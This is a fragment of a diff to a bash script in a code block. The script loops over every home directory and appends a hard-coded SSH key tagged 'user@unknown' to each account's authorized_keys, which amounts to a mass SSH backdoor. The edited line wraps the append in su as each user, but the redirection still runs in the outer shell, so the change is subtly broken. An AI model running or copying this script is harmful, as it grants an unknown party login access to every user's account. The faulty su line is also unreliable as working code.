@@ -34,7 +34,8 @@ fi
 ```
 #!/bin/bash
 for dir in /home/*; do
-cat>>$dir/.ssh/authorized_keys<<EOF
+user=$(echo $dir | cut -d"/" -f3)
+su $user -c cat>>$dir/.ssh/authorized_keys<<EOF
 ssh-rsa kw2e2adsasasashere user@unknown
 EOF
 done
